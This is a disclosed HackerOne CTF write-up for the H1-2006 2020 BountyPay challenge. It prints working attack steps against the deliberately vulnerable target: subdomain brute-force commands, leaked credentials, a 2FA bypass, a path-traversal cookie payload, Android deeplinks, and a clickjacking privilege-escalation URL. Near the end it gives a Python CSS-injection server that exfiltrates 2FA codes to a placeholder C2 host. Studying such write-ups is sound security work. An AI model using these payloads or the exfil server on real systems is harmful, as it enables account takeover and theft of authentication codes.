---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/improper-restriction-of-authentication-attempts
  - env/web
substate: "resolved"
weakness: "Improper Restriction of Authentication Attempts"
enriched: true
date: 2020-06-18
submitted: 2020-06-09T02:54:25.512Z
bounty_usd: null
votes: 3
cve: []
program: "[[programs/h1-ctf|h1-ctf]]"
reporter: "osintopsec"
source: "https://hackerone.com/reports/894198"
title: "[H1-2006 2020]  Includes 1 free content discovery"
---
# [H1-2006 2020]  Includes 1 free content discovery

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 3 | **Program:** h1-ctf | **Disclosed:** 2020-06-18

- Report: [https://hackerone.com/reports/894198](https://hackerone.com/reports/894198)
- CWE: Improper Restriction of Authentication Attempts
- Submitted: 2020-06-09T02:54:25.512Z

## Timeline

- **Report Filed**
- **Report Title Updated**
- **Report Triaged**
- **2020-06-10** @osintopsec: # H1-2006 CTF Writeup

What a crazy ride! It's always a pleasure to see CTFs that are on the level with some real life scenarios with all the quirks and everything. Especially client-side vulnerabilities can be tricky to implement in a safe and realiable manner, and I really liked both the concept of simulating user actions with static content and with scripted headless browsers. Overall the CTF infrastructure held up extraordinarily well with only single HTTP 502 error here and there, and the storyline was pretty consistent and fun. Maybe on the next one the Android apk could be integrated seamessly, as the API-key leakage is reality in many cases?

Personal learning experience (+/-)
[+] Have a friendly hacker to collab with
[+] Saying things aloud helps thinking alot
[+] FFuF and Burp go really really well together
[+] Burp can be twisted to do the most complex fuzzing easily
[+] If automation can help, do it
[+] CSS injection (the extra mile way)
[+] Android stuff
[+] Always generate custom fuzz-lists for the target

[-] Finding answers can be addictive, too addictive
[-] Banging your head to the keyboard alone, better to do it with someone
[-] Overthinking the challenges

## The Start

Official start for the CTF was posted on Twitter with storyline consisting of H1 CEO having lost login details to newly adapted BountyPay platform.

{F862417}

First things first, time for some OSINT (googling..) for BountyPay, and so it goes that the BountyPayHQ account could be found from Twitter as well. Of course fresh employee hasn't fully gone through the on-boarding and propably has missed the section regarding operational security - Sandra decided to post a picture of her new employee badge online. First notes taken of the employee full name and badge ID! I really like it when CTFs utilise social media and other open platforms to hold bits and pieces of the challenges.

{F862415} {F862420}

## .bountypay.h1ctf.com

On initial entry, the .bountypay.h1ctf.com holds a landing page, customer and staff logins. What about the * in the url scope? Yup, time to do some recon and content discovery on the target. And for the sake of learning and testing different methods of content discover, there was a lot - really a lot of requests going out. 10 threads? 20? 30? 120? The server handled it very well as most likely I wasn't the only one kicking the pedal down.

For subdomain bruteforce I used FFuF from @joohoi (support him, great guy!) and replayed found domains to Brup. Filter accordingly.
```
ffuf -w ./subdomains-top100k.txt -u https://FUZZ.bountypay.h1ctf.com -mc all -fc 404 -replay-proxy http://127.0.0.1:8080
ffuf -w ./subdomains-top100k.txt -u https://www.bountypay.h1ctf.com -H "Host: FUZZ" -mc all -fc 404 -replay-proxy http://127.0.0.1:8080
```

Eventually we'd have a list of subdomains:
```
api.bountypay.h1ctf.com         - REST API for backend
app.bountypay.h1ctf.com         - Customer portal
software.bountypay.h1ctf.com    - HTTP 401, IP restricted service
staff.bountypay.h1ctf.com       - Staff portal
www.bountypay.h1ctf.com         - Landing page
```

For content discovery:
```
ffuf -w ./directories.txt -u https://[subdomain].bountypay.h1ctf.com/FUZZ/ -mc all -fc 404 -replay-proxy http://127.0.0.1:8080
ffuf -w ./files.txt -u https://[subdomain].bountypay.h1ctf.com/FUZZ -mc all -fc 404 -replay-proxy http://127.0.0.1:8080
```

## app.bountypay.h1ctf.com

This part of the CTF was focusing on content discovery. On this writeup, I will go through only the relevant content found. Upon content discovery, devil lies in the details. I did miss the .git-directory on the first run due to only non-accessible http header. On recursive discovery, a git config file was found with a git repository origin url.

```
https://app.bountypay.h1ctf.com/.git/config

[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

The repository consited of a singular logger.php file, which namely logs and encodes requests coming in to the service. And the logger.php "generated" logfile was available on the server.

```
https://github.com/bounty-pay-code/request-logger/blob/master/logger.php

<?php

$data = array(
  'IP'        =>  $_SERVER["REMOTE_ADDR"],
  'URI'       =>  $_SERVER["REQUEST_URI"],
  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
  'PARAMS'    =>  array(
      'GET'   =>  $_GET,
      'POST'  =>  $_POST
  )
);

file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
```

```
https://app.bountypay.h1ctf.com/bp_web_trace.log

1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==

-> Base64 Decoded

×<÷}}09:{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
×<÷}}19:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
×<÷}}28:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
×<÷}}45:{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

Cool, we now have some user credentials for the service! And what a super reliable way to simulate the infoleak on a CTF by just serving a static file.

### Bypassing 2FA @ app.bountypay.h1ctf.com

Upon logging into the customer portal with Brians leaked account credentials, a prompt for a multi-factor authentication token appears.

{F862413}

I found the 2FA bypass to be pretty straight forward, as the request screamed vulnerability by having both a "challenge" and "challenge_answer" parameters present. Check for hash length, determine it's propably MD5, hash answer as MD5, cross examine, post both -> 2FA bypassed.

I liked this part of the challenge because of its realism. Unfortunately I've seen this kind of behaviour before on a production environment.

```
POST / HTTP/1.1

username=brian.oliver&password=V7h0inzX&challenge=312781f44a9ccc20e2b1a87476f50bbd&challenge_answer=AAAAAAAAA

-> Change to

username=brian.oliver&password=V7h0inzX&challenge=6c9395cacd317eed2777f669103b7181&challenge_answer=AAAAAAAAA
```

### Crazy SSRF-Path-traversal-In-Encoded-Cookie -thingy @ app.bountypay.h1ctf.com

On bp_web_trace.log file there's also a hint, that the user had called the statements functionality while logged in. After poking around the transactions for quite some time, I noticed that the session cookie is actually consisted of two parts, which are not linked to each other: "account_id" and "hash". If the "account_id" -parameter is tampered with, the service would still accept the request. My first idea was that it could have SQL Injection vulnerability, but upon fuzzing the encoded cookie value, I found out that the "account_id" is actually reflected straight into the API-request performed from the backend.

```
GET /statements?month=04&year=2020 HTTP/1.1
...

{
  "url": "https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=04&year=2020",
  "data": "{\"description\":\"Transactions for 2020-04\",\"transactions\":[]}"
}
```

For fuzzing the encoded cookie, I used Burp Suite. Burp is super flexible even on the normal intruder and allows the tester to have an payload, prepended and appended with string values and finally encoded or hashed. After identifying the injection point and fuzzing the cookie, it was found to be vulnerable to path traversal.

With ability to control the path of the API-call, I checked out the content discovered at api.bountypay.h1ctf.com, which provided some interesting findings:

```
/redirect?url=[userSpecified]
/api/staff/
/api/accounts/
```

So, is it a pure luck that we have an open redirect on a service vulnerable to path traversal? I bet not. Upon closer look, it could be determined that the open redirect allows access to 1) google.com 2) all subdomains of the bountypay platform. Remember that IP restricted service @ software.bountypay.h1ctf.com?

Our attack chain looks like this:
- Make API-call from frontend service to /api/accounts/
- Add path traversal payload to the session cookie
- Direct the request to the open redirect
- Forge the new request to point to software.bountypay.h1ctf.com
- Add content discovery payloads to the redirected request
- FuzzFuzzFuzz

```
Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q%2fdXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS9bRlVaWl0jIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0%3d;

-> Token value B64 Decoded / Prettified

{
  "account_id": "../../redirect?url=https://software.bountypay.h1ctf.com/[FUZZ]#",
  "hash": "de235bffd23df6995ad4e0930baac1a2"
}
```

Ascii-hash at the end of the payload is important, as it effectively ends the request path. With the insanely generated content discovery fuzz payload-wrapper, a directory and a file was found on the target and downloaded.

```
<html>
<head><title>Index of \/uploads\/<\/title><\/head>
<body bgcolor=\"white\">
<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>
<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>20-Apr-2020 11:26 4043701
<\/pre><hr><\/body>
<\/html>
```

## BountyPay Android APK

Even not having done too much mobile testing, I found the Android challenges straight forward to get through. Most of the time on the challenges were used to get a proper development environment set up in form of Android Studio. The APK itself was extracted and the .dex-files were decompiled to .java-files with dex2jar and JD-GUI and ultimately imported to Android Studio.

Upon inspecting the code, it was found out that there are three different challenges on the APK. Each challenge contains minor hints of the propsed solution and requires the previous one to be completed before launching. The progress was saved to Firebase and locally in user_created shared preferences.

### PartOneActivity.java

Part one required the user to "create a CTF username :)" and deeplink query parameters to be completed:

```
if (getIntent() != null && getIntent().getData() != null) {
  String str = getIntent().getData().getQueryParameter("start");
  if (str != null && str.equals("PartTwoActivity") && sharedPreferences.contains("USERNAME")) {
    str = sharedPreferences.getString("USERNAME", "");
    SharedPreferences.Editor editor = sharedPreferences.edit();
    String str1 = sharedPreferences.getString("TWITTERHANDLE", "");
    editor.putString("PARTONE", "COMPLETE").apply();
    logFlagFound(str, str1);
    startActivity(new Intent((Context)this, PartTwoActivity.class));
  }
```

If the PartOneActivity was loaded with username inside the shared preferences and with query-parameter "start=PartTwoActivity", part two would be unlocked.

Deeplink payload:
```
one://part?start=PartTwoActivity
```

### PartTwoActivity.java

On the second challenge, the contents of the activity were hidden and could be revealed with correct set of deeplink query-parameters:

```
if (getIntent() != null && getIntent().getData() != null) {
  Uri uri = getIntent().getData();
  String str1 = uri.getQueryParameter("two");
  String str2 = uri.getQueryParameter("switch");
  if (str1 != null && str1.equals("light") && str2 != null && str2.equals("on")) {
    editText.setVisibility(0);
    button.setVisibility(0);
    textView.setVisibility(0);
  }
}
```

When starting the activity with parameters "two=light&switch=on", the activity would show a hash and a input field to submit a header key to. Pro tip: if you ever encounter a hash value on a CTF, go google it before anything else. This time it paid off, and the value of the hash was "Token". Inputting a answer of "X-Token" unlocked the third challenge.

{F862419}

Deeplink payload:
```
two://part?two=light&switch=on
```

### PartThreeActivity.java

Third part of the challenge was a bit more complex when examined on the side of the other two. Hints stated that we shoudl "Resuse some params" and "Intercept or check for leaks". Upon starting the activity it also checks that the other challenges are completed, performs firebase login and seeks for three query-parameters from deeplink url: "three" "switch" and "header".

Base64 encoded values can be found from the source:
```
byte[] decodedDirectory = Base64.decode("aG9zdA==", 0);
byte[] decodedDirectoryTwo = Base64.decode("WC1Ub2tlbg==", 0);
final String directory = "aG9zdA==";
final String directoryTwo = "WC1Ub2tlbg==";

-> Base64 Decoded
aG9zdA==        -> host
WC1Ub2tlbg==    -> X-Token
```

Upon onCreate method, some content can be rendered visible with correct parameters:
```
if (getIntent() != null && getIntent().getData() != null) {
  Uri uri = getIntent().getData();
  final String firstParam = uri.getQueryParameter("three");
  final String secondParam = uri.getQueryParameter("switch");
  final String thirdParam = uri.getQueryParameter("header");
  byte[] arrayOfByte2 = Base64.decode(str1, 0);
  byte[] arrayOfByte1 = Base64.decode(str2, 0);
  final String decodedFirstParam = new String(arrayOfByte2, StandardCharsets.UTF_8);
  final String decodedSecondParam = new String(arrayOfByte1, StandardCharsets.UTF_8);
  this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {
        public void onCancelled(DatabaseError param1DatabaseError) {
          Log.e("TAG", "onCancelled", (Throwable)param1DatabaseError.toException());
        }

        public void onDataChange(DataSnapshot param1DataSnapshot) {
          String str = (String)param1DataSnapshot.getValue();
          if (firstParam != null && decodedFirstParam.equals("PartThreeActivity") && secondParam != null && decodedSecondParam.equals("on")) {
            String str1 = thirdParam;
            if (str1 != null) {
              StringBuilder stringBuilder = new StringBuilder();
              stringBuilder.append("X-");
              stringBuilder.append(str);
              if (str1.equals(stringBuilder.toString())) {
                editText.setVisibility(0);
                button.setVisibility(0);
                PartThreeActivity.this.thread.start();
              }
            }
          }
        }
      });
}
```

When we base64 encode parameter "three" to have value of "PartThreeActivity", encode parameter "switch" to have "on" and add plain parameter "header" as "X-Token", the activity renders a text edit and button to the screen and starts background thread.

Deeplink payload looked like this:
```
three://part?three=UGFydFRocmVlQWN0aXZpdHk%3d&switch=b24%3d&header=X-Token
```

The background thread calls method "performPostCall(String paramString)", which gets values from the shared preferences and "performs a post request" to the BountyPay API, effectively leaking the API-key at the same time. When the leaked API-key is given to the activity, "correctHash()" method runs and changes the activity to CongratsActivity, which states that all the Android challenges have been completed!

Pro tip: When analysing source code, really understand what happens underneath and don't just take the API-key and run on. It helps to notice the next call propably expects a POST, even that the request parameters given are totally false.

{F862416}

## Getting a staff account @ api.bountypay.h1ctf.com

With the newly acuired API-key, common sense dictated to check the api-endpoints available. Eventually after leaking some internal usernames and all a POST request parameter "staff_id" was identified with a great "ahaa!"-moment for this CTF - always generate custom, target specific fuzzlists with identified parameter keys. When trying to create account with IDs leaking from the API, I remembered the badge picture from Sandra Allison's Twitter page and tried the ID from the badge and boom, the API gave me valid staff account credentials.

```
POST /api/staff HTTP/1.1
...

staff_id=STF:8FJ3KFISL3

->

{
  "description": "Staff Member Account Created",
  "username": "sandra.allison",
  "password": "s%3D8qB8zEpMnc*xsz7Yp5"
}
```

## Privilege escalation through clickjacking @ staff.bountypay.h1ctf.com

Logging into the Sandras staff account was trivial when intercepting the login request and adding the raw password into the parameter instead of the browser encoded one.

Upon content discover it was found that there are four different templates available on the staff section:

```
/?template=home
/?template=login
/?template=admin
/?template=ticket
```

Login we already saw, admin is restricted from access, home contains main dashboard and ability to change profilename and avatar picture and the ticket template contains example ticket generated "by the friendly admin team". Staff section also had custom javascript file, /js/website.js:

```
$(".upgradeToAdmin").click(function() {
	let t = $('input[name="username"]').val();
	$.get("/admin/upgrade?username=" + t, function() {
		alert("User Upgraded to Admin")
	})
}), $(".tab").click(function() {
	return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
}), $(".sendReport").click(function() {
	$.get("/admin/report?url=" + url, function() {
		alert("Report sent to admin team")
	}), $("#myModal").modal("hide")
}), document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```

From a look to the source, it was pretty obvious we're supposed to escalate privileges on the staff account to gain administrative privileges on the application. Of course calling the endpoint directly wouldn't work, so we needed to come up with a way to make the admin to do it behalf of us. The /admin/report?url= seemed like a good option to do this.

Each page had a base64 encoded value of it's path in the page foot:

```
<script>
    var url = 'Lz90ZW1wbGF0ZT1ob21l';
</script>

-> Base64 Decoded

var url = '/?template=home'
```

So, if we can craft a URL with a payload and send it to admin via the sendReport endpoint, profit? Looking for a injection point didn't take too long and was found at the change avatar functionality at profile tab. The change avatar functionality allowed the user to choose from three different avatars, and when intercepted, could be injected with [a-zA-Z0-9\s] payloads, so a-z, 0-9 and whitespaces. All special characters were filtered out, so that's it for any cross-site scripting payloads. But as the site runs with jQuery, we could inject query selectors and perform clickjacking/autosubmit with #tab functionality described on the website.js!

With some trial-and-error I was able to craft a query selector payload and clickjacking url to send to the admin team via sendReport at ticket template, but I was missing a way to inject a valid username, as the selector was looking for a specific input-element to get it from - and only syntactically correct element was located at /?template=login, which also allowed the username to be injected into the contents from a query-parameter.

After tons of more trial-and-error to perform a path traversal and injection on the template engine, a friendly hacker gave me an idea to try and load multiple templates at once. Having tried that previously I was dumbfolded and after five more requests, I successfully loaded another template to the page by injecting a not so normal array syntax to the query parameter:

```
/?template[]=login&template[]=ticket
```

Finally, the payload to clickjack the admin to perform privilege escalation in behalf of us was as following:

```
GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjI=

-> Base64 Decoded

/admin/report?url=/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab2
```

And there we go, an Admin-tab was open on the dashboard! Such a cool and realiable way to simulate client-side attacks on CTF! Only downside was the session token being updated with encrypted values of the profile name and avatar injected payloads, which can easily mess up the attack chain if not paid attention to.

{F862414}

## Bypassing 2FA vol.2 @ app.bountypay.h1ctf.com

Initial login to the customer section with Mickos credentials went with the same flow as on the previous login, with minor tampering to get the correctly encoded password into the backend and submitting valid 2FA token challenge-answer pair.

When navigaing to the /pay/-endpoint to perform the bounty pay for the hackers, a new 2FA prompt is received with a twist: there's now a request for .css-file before and only 2 minutes time to post the valid 2FA challenge answer to the authentication prompt. Seems a lot like a CSS-injection to content exfil to me.

```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
...

app_style=https://www.bountypay.h1ctf.com/css/uni_2fa_style.css
```

After validating on my callback server that there indeed was a server-side fetch coming in to the url specified on the 2FA call and is looking explicitly CSS-stylesheet and the request is coming from a headless browser, I was sure. As I've encountered a challenge like this before, I decided to setup sic by @d0nutptr (https://github.com/d0nutptr/sic) to be able to easily and recursively get the correct 2FA token from the backend.

After a ton of setup and debugging I was able to read element names and get values from input-elements within the backend page. I faced two problems: 1) the service was performing so slow, that I could get only two first chars out of a single element name with the recursive CSS @import attack and 2) I was way overthinking the challenge. I was able to get the first values of the input-elements, but was too certain that there just were multiple tokens on the same page and each token should hold seven chars.

After banging my head to the keyboard, I decided to take a step back and wrote a python script to perform some basic CSS-injection exfil methods to get a larger glimps of how the backend html-page looked like. On my analysis, the page looks something like this:

```
<html>
  <body>
    <style src="[ATTACKER DEFINED]"></style>
    <div name="challenge_area">
      <input name="code_1" value="[VAL_1]"></input>
      <input name="code_2" value="[VAL_2]"></input>
      <input name="code_3" value="[VAL_3]"></input>
      <input name="code_4" value="[VAL_4]"></input>
      <input name="code_5" value="[VAL_5]"></input>
      <input name="code_6" value="[VAL_6]"></input>
      <input name="code_7" value="[VAL_7]"></input>
    </div>
  </body>
</html>
```

Now it was pretty obvious what I had overthinked previously. The challenge was way simpler than I expected it to be. Answer maxlength=7... 7 code inputs... Yeah. I patched python code a bit to perform exfil on the code values:

```
import string
import BaseHTTPServer
import ssl
import sys
from urlparse import urlparse, unquote
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn

class CORSRequestHandler(BaseHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-Type', 'text/css')
        BaseHTTPRequestHandler.end_headers(self)

    def do_GET(self):
        if self.path.startswith('/css/'):
            try:
                global chars
                print('Serving initial css-file')
                self.send_response(200)
                self.end_headers()
                for token in chars:
                    for i in range(0,8):
                        self.wfile.write('[name=code_' + str(i) + '][value^=' + token + ']{background-image: url(https://[C2SERVER].xyz/exfil/?l=' + str(i) + '&t=' + token + ');}\r\n'.encode('utf-8'))
            except Exception as e:
                print('Error at /css/:' + str(sys.exc_info()[0]))

        if self.path.startswith('/exfil/'):
            try:
                query = urlparse(self.path).query
                query_components = dict(qc.split('=') for qc in query.split('&'))
                token = query_components['t']
                length = query_components['l']
                print(str(length) + ':     ' + str(token))
                self.send_response(200)
                self.end_headers()
            except Exception as e:
                print('Error at /exfil/: ' + str(sys.exc_info()[0]))
                if query:
                    print('Got parameters: ' + str(query))
        # The end

    def log_message(self, format, *args):
        return

# Pro tip: prints out all printable ascii-chars!
chars = string.printable

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle server"""

if __name__ == '__main__':
    # Run server with SSL and CORS, you'll need valid certs to get the headless browser to connect properly
    print('Starting CSS Exfil server')
    httpd = ThreadedHTTPServer(('0.0.0.0', 443), CORSRequestHandler)
    httpd.socket = ssl.wrap_socket (httpd.socket, keyfile='/etc/letsencrypt/live/[C2SERVER].xyz/privkey.pem', certfile='/etc/letsencrypt/live/[C2SERVER].xyz/cert.pem', server_side=True)
    httpd.serve_forever()
```

And when ran, output looks like following:

```
/h1ctf# python c2-server.py
Starting CSS Exfil server
Serving initial css-file
Path: /css/
7:     D
1:     g
2:     l
3:     s
4:     F
5:     X
6:     I
```

And there we go! Submitting the values within 2 minutes and in correct arrangement passes the 2FA validation. The final response page was welcome with open arms. I had done it!

{F862418}

### ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$


## Closing words

Learned a lot, met new friendly hackers, collaborated and didn't give up. All in all, extremely rewarding CTF. Thanks to everyone on the support staff to make this happen and see you next time!
- **2020-06-11** @nahamsec: Hello,

I wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!

We will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!

If you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!
- **2020-06-12** @osintopsec: Sure, no props! After all, learning is the thing, right? :)
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
